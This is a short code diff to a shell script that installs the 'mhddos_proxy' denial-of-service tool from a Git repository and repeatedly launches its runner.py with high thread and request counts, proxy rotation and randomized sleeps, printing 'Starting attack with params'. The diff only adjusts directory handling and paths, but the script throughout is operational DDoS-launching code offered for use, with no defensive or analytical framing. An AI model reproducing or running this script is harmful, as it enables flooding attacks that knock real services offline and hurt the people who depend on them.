@@ -8,8 +8,10 @@ sudo pip install --upgrade pip
 
 cd ~
 sudo rm -r mhddos_proxy
+
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-python3 -m pip install -r ~/mhddos_proxy/requirements.txt
+cd mhddos_proxy/
+python3 -m pip install -r requirements.txt
 
 threads="${1:-800}"
 rpc="--rpc 2000"
@@ -41,7 +43,7 @@ do
       echo "Starting attack with params: $cmd_line $threads_per_target $rpc $proxy_upd $debug"
       echo "---------"
       echo ""
-      python3 ~/mhddos_proxy/runner.py $cmd_line $threads_per_target $rpc $proxy_upd $debug &
+      python3 runner.py $cmd_line $threads_per_target $rpc $proxy_upd $debug &
    done
    
    sleep $[ ( $RANDOM % 25 )  + 55 ]m
